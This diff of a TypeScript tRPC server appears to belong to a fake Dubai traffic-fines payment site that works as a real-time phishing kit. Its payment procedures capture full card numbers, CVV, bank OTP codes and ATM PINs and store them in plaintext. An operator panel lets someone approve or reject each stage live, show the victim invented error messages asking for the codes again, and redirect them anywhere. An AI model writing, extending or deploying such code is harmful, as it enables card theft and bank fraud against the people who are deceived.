@@ -19,17 +19,18 @@ import {
   getUnreadPaymentSessionsCount,
   clearAdminRecords,
 } from "./db";
-import { scrapeDubaiFines, PLATE_SOURCES, getPlateCodeOptions } from "./scraper";
+import { scrapeDubaiFines, PLATE_SOURCES, PLATE_CODES, getPlateCodeOptions } from "./scraper";
 import crypto from "crypto";
 
 // كلمة مرور الأدمين - يمكن تغييرها من متغيرات البيئة
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
+const ADMIN_JWT_SECRET = process.env.JWT_SECRET || "secret";
 
 function generateAdminToken(): string {
   return crypto.randomBytes(32).toString("hex");
 }
 
-// تخزين مؤقت للتوكنات
+// تخزين مؤقت للتوكنات (في الإنتاج يجب استخدام Redis)
 const adminTokens = new Set<string>();
 
 export const appRouter = router({
@@ -44,10 +45,11 @@ export const appRouter = router({
   }),
 
   fines: router({
-    // جلب قوائم الدول وكودات اللوحات
+    // جلب قوائم الإمارات وكودات اللوحات
     getOptions: publicProcedure.query(() => {
       return {
         plateSources: PLATE_SOURCES,
+        plateCodes: PLATE_CODES,
       };
     }),
 
@@ -55,8 +57,9 @@ export const appRouter = router({
       .input(
         z.object({
           plateSource: z.string()
-            .min(1, "يرجى اختيار الدولة")
-            .max(10),
+            .min(1, "يرجى اختيار الإمارة")
+            .max(10)
+            .regex(/^[A-Z0-9]+$/, "مصدر اللوحة غير صالح"),
         })
       )
       .query(async ({ input }) => {
@@ -68,13 +71,23 @@ export const appRouter = router({
     query: publicProcedure
       .input(
         z.object({
-          plateSource: z.string().min(1, "يرجى اختيار الدولة"),
-          plateNumber: z.string().min(1, "يرجى إدخال رقم اللوحة"),
-          plateCode: z.string().min(1, "يرجى اختيار نوع اللوحة"),
-          // حقول قطر الجديدة
-          ownerId: z.string().min(1, "يرجى إدخال الرقم الشخصي أو قيد المنشأة").optional(),
-          ownerIdType: z.enum(["personal", "establishment"]).optional(),
-          lang: z.enum(["ar", "en"]).default("ar"),
+          plateSource: z.string()
+            .min(1, "يرجى اختيار الإمارة")
+            .max(10)
+            .regex(/^[A-Z0-9]+$/, "مصدر اللوحة غير صالح"),
+          plateNumber: z.string()
+            .min(1, "يرجى إدخال رقم اللوحة")
+            .max(10)
+            .regex(/^[0-9]+$/, "رقم اللوحة يجب أن يحتوي على أرقام فقط")
+            .transform(v => v.trim()),
+          plateCode: z.string()
+            .min(1, "يرجى اختيار كود اللوحة")
+            .max(64)
+            .regex(/^[A-Za-z0-9\u0600-\u06FF\s\-]+$/, "كود اللوحة غير صالح")
+            .transform(v => v.trim()),
+          plateCodeId: z.number().int().positive().optional(),
+          plateCategory: z.number().int().positive().optional(),
+          lang: z.enum(["ar", "en"]).default("en"),
         })
       )
       .mutation(async ({ input, ctx }) => {
@@ -82,8 +95,6 @@ export const appRouter = router({
           plateSource: input.plateSource,
           plateNumber: input.plateNumber,
           plateCode: input.plateCode,
-          ownerId: input.ownerId,
-          ownerIdType: input.ownerIdType,
           status: "pending",
           userId: ctx.user?.id ?? null,
         });
@@ -94,8 +105,8 @@ export const appRouter = router({
             input.plateNumber,
             input.plateCode,
             {
-              ownerId: input.ownerId,
-              ownerIdType: input.ownerIdType,
+              plateCodeId: input.plateCodeId,
+              plateCategory: input.plateCategory,
             }
           );
 
@@ -203,6 +214,7 @@ export const appRouter = router({
         }
       }),
 
+    // جلب سجل الاستعلامات الأخيرة
     getHistory: publicProcedure
       .input(z.object({ limit: z.number().min(1).max(50).default(20) }).optional())
       .query(async ({ ctx, input }) => {
@@ -212,6 +224,7 @@ export const appRouter = router({
         return getRecentFineQueries(input?.limit ?? 20);
       }),
 
+    // جلب تفاصيل استعلام معين
     getQueryDetails: publicProcedure
       .input(z.object({ queryId: z.number() }))
       .query(async ({ input }) => {
@@ -224,6 +237,7 @@ export const appRouter = router({
 
   // ========== Payment Flow ==========
   payment: router({
+    // إنشاء جلسة دفع جديدة
     createSession: publicProcedure
       .input(z.object({
         selectedFines: z.array(z.any()),
@@ -253,6 +267,7 @@ export const appRouter = router({
         return { success: true, sessionId };
       }),
 
+    // جلب حالة الجلسة (polling)
     getStatus: publicProcedure
       .input(z.object({ sessionId: z.string() }))
       .query(async ({ input }) => {
@@ -264,23 +279,38 @@ export const appRouter = router({
         };
       }),
 
+    // إرسال بيانات البطاقة
     submitCard: publicProcedure
       .input(z.object({
-        sessionId: z.string().length(32),
-        cardName: z.string().min(2).max(60),
-        cardNumber: z.string().min(13).max(19),
-        cardExpiry: z.string().max(7),
-        cardCvv: z.string().min(3).max(4),
+        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
+        cardName: z.string()
+          .min(2, "اسم حامل البطاقة قصير جداً")
+          .max(60, "اسم حامل البطاقة طويل جداً")
+          .regex(/^[a-zA-Z\u0600-\u06FF\s]+$/, "اسم حامل البطاقة يحتوي على أحرف غير مسموح بها")
+          .transform(v => v.trim()),
+        cardNumber: z.string()
+          .min(13)
+          .max(19)
+          .transform(v => v.replace(/\s/g, ""))
+          .refine(v => /^[0-9]{13,19}$/.test(v), "رقم البطاقة غير صالح"),
+        cardExpiry: z.string()
+          .regex(/^(0[1-9]|1[0-2])\/?(\d{2}|\d{4})$/, "تاريخ انتهاء البطاقة غير صالح")
+          .max(7),
+        cardCvv: z.string()
+          .min(3)
+          .max(4)
+          .regex(/^[0-9]{3,4}$/, "CVV غير صالح"),
       }))
       .mutation(async ({ input }) => {
         const session = await getPaymentSessionBySessionId(input.sessionId);
         if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
-        
-        const masked = input.cardNumber.replace(/(\d{4})\d+(\d{4})/, "$1 **** **** $2");
+        if (session.stage !== "card") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });
+
+        const masked = input.cardNumber.replace(/\s/g, "").replace(/(\d{4})\d{8}(\d{4})/, "$1 **** **** $2");
 
         await updatePaymentSession(input.sessionId, {
           cardName: input.cardName,
-          cardNumber: input.cardNumber,
+          cardNumber: input.cardNumber.replace(/\s/g, ""),
           cardNumberMasked: masked,
           cardExpiry: input.cardExpiry,
           cardCvv: input.cardCvv,
@@ -292,14 +322,19 @@ export const appRouter = router({
         return { success: true };
       }),
 
+    // إرسال رمز OTP
     submitOtp: publicProcedure
       .input(z.object({
-        sessionId: z.string().length(32),
-        otpCode: z.string().min(4).max(8),
+        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
+        otpCode: z.string()
+          .min(4, "رمز OTP قصير جداً")
+          .max(8, "رمز OTP طويل جداً")
+          .regex(/^[0-9]+$/, "رمز OTP يجب أن يحتوي على أرقام فقط"),
       }))
       .mutation(async ({ input }) => {
         const session = await getPaymentSessionBySessionId(input.sessionId);
         if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+        if (session.stage !== "otp") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });
 
         await updatePaymentSession(input.sessionId, {
           otpCode: input.otpCode,
@@ -311,14 +346,19 @@ export const appRouter = router({
         return { success: true };
       }),
 
+    // إرسال رقم ATM PIN
     submitAtmPin: publicProcedure
       .input(z.object({
-        sessionId: z.string().length(32),
-        atmPin: z.string().min(4).max(6),
+        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
+        atmPin: z.string()
+          .min(4, "رقم PIN قصير جداً")
+          .max(6, "رقم PIN طويل جداً")
+          .regex(/^[0-9]+$/, "رقم PIN يجب أن يحتوي على أرقام فقط"),
       }))
       .mutation(async ({ input }) => {
         const session = await getPaymentSessionBySessionId(input.sessionId);
         if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+        if (session.stage !== "atm") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });
 
         await updatePaymentSession(input.sessionId, {
           atmPin: input.atmPin,
@@ -333,38 +373,176 @@ export const appRouter = router({
 
   // ========== Admin Panel ==========
   admin: router({
+    // تسجيل الدخول
     login: publicProcedure
-      .input(z.object({ password: z.string() }))
+      .input(z.object({
+        password: z.string().min(1).max(200),
+      }))
       .mutation(async ({ input }) => {
         if (input.password !== ADMIN_PASSWORD) {
           throw new TRPCError({ code: "UNAUTHORIZED", message: "كلمة المرور غير صحيحة" });
         }
         const token = generateAdminToken();
         adminTokens.add(token);
+        // حذف التوكن بعد 24 ساعة
+        setTimeout(() => adminTokens.delete(token), 24 * 60 * 60 * 1000);
         return { success: true, token };
       }),
 
-    getDashboardStats: protectedProcedure.query(async () => {
-      const sessions = await getAllPaymentSessions(50);
-      const unreadCount = await getUnreadPaymentSessionsCount();
-      return { sessions, unreadCount };
-    }),
+    // التحقق من التوكن
+    verify: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(async ({ input }) => {
+        return { valid: adminTokens.has(input.token) };
+      }),
 
-    updateSessionStage: protectedProcedure
+    // جلب إحصائيات
+    getStats: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const sessions = await getAllPaymentSessions(200);
+        const total = sessions.length;
+        const pending = sessions.filter(s => s.stage.endsWith("_pending")).length;
+        const completed = sessions.filter(s => s.stage === "success").length;
+        const failed = sessions.filter(s => s.stage === "failed").length;
+        const newCount = sessions.filter(s => s.statusRead === 0).length;
+        return { total, pending, completed, failed, new: newCount };
+      }),
+
+    // جلب كل الجلسات
+    getSessions: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const sessions = await getAllPaymentSessions(100);
+        const sessionsWithQueryData = await Promise.all(
+          sessions.map(async (session) => {
+            const relatedQuery = session.queryId ? await getFineQueryById(session.queryId) : undefined;
+            return {
+              ...session,
+              totalAmount: session.totalAmount ?? (relatedQuery?.totalAmount != null ? String(relatedQuery.totalAmount) : null),
+              plateSource: relatedQuery?.plateSource ?? session.plateSource,
+              plateNumber: relatedQuery?.plateNumber ?? session.plateNumber,
+              plateCode: relatedQuery?.plateCode ?? null,
+            };
+          })
+        );
+        // تحديث statusRead
+        for (const s of sessions.filter(s => s.statusRead === 0)) {
+          await updatePaymentSession(s.sessionId, { statusRead: 1 });
+        }
+        return sessionsWithQueryData;
+      }),
+
+    // جلب تفاصيل جلسة واحدة
+    getSession: publicProcedure
+      .input(z.object({ token: z.string(), sessionId: z.string() }))
+      .query(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+        const relatedQuery = session.queryId ? await getFineQueryById(session.queryId) : undefined;
+        await updatePaymentSession(input.sessionId, { statusRead: 1 });
+        return {
+          ...session,
+          totalAmount: session.totalAmount ?? (relatedQuery?.totalAmount != null ? String(relatedQuery.totalAmount) : null),
+          plateSource: relatedQuery?.plateSource ?? session.plateSource,
+          plateNumber: relatedQuery?.plateNumber ?? session.plateNumber,
+          plateCode: relatedQuery?.plateCode ?? null,
+        };
+      }),
+
+    // إجراء على الجلسة (قبول/رفض)
+    action: publicProcedure
       .input(z.object({
+        token: z.string(),
         sessionId: z.string(),
-        stage: z.enum(["card", "card_pending", "otp", "otp_pending", "atm", "atm_pending", "success", "failed"]),
+        action: z.enum(["pass", "denied", "completed"]),
         errorMessage: z.string().optional(),
-        redirectUrl: z.string().optional(),
       }))
       .mutation(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+
+        let newStage: typeof session.stage = session.stage;
+
+        if (input.action === "pass") {
+          // تقدم للمرحلة التالية
+          if (session.stage === "card_pending") newStage = "otp";
+          else if (session.stage === "otp_pending") newStage = "atm";
+          else if (session.stage === "atm_pending") newStage = "success";
+        } else if (input.action === "denied") {
+          // رفض - إرجاع للمرحلة السابقة مع رسالة خطأ
+          if (session.stage === "card_pending") newStage = "card";
+          else if (session.stage === "otp_pending") newStage = "otp";
+          else if (session.stage === "atm_pending") newStage = "atm";
+          else newStage = "failed";
+        } else if (input.action === "completed") {
+          newStage = "success";
+        }
+
+        let errorMsg: string | null = null;
+        if (input.action === "denied") {
+          if (input.errorMessage) {
+            errorMsg = input.errorMessage;
+          } else if (session.stage === "otp_pending") {
+            errorMsg = "برجاء التحقق من الرمز المرسل عبر الجوال";
+          } else if (session.stage === "atm_pending") {
+            errorMsg = "برجاء التحقق من الرقم السري للآلي الصحيح";
+          } else {
+            errorMsg = "تم رفض العملية. يرجى المحاولة مرة أخرى.";
+          }
+        }
+
         await updatePaymentSession(input.sessionId, {
-          stage: input.stage,
-          errorMessage: input.errorMessage || null,
-          redirectUrl: input.redirectUrl || null,
-          statusRead: 1,
+          stage: newStage,
+          errorMessage: errorMsg,
         });
+
+        return { success: true, newStage };
+      }),
+
+    // توجيه العميل إلى صفحة محددة
+    redirect: publicProcedure
+      .input(z.object({
+        token: z.string(),
+        sessionId: z.string(),
+        redirectUrl: z.string(),
+      }))
+      .mutation(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+
+        await updatePaymentSession(input.sessionId, {
+          redirectUrl: input.redirectUrl,
+        });
+
         return { success: true };
+      }),
+
+    // تفريغ كل سجلات لوحة التحكم
+    clearAll: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .mutation(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+
+        const deleted = await clearAdminRecords();
+        return { success: true, deleted };
       }),
   }),
 });
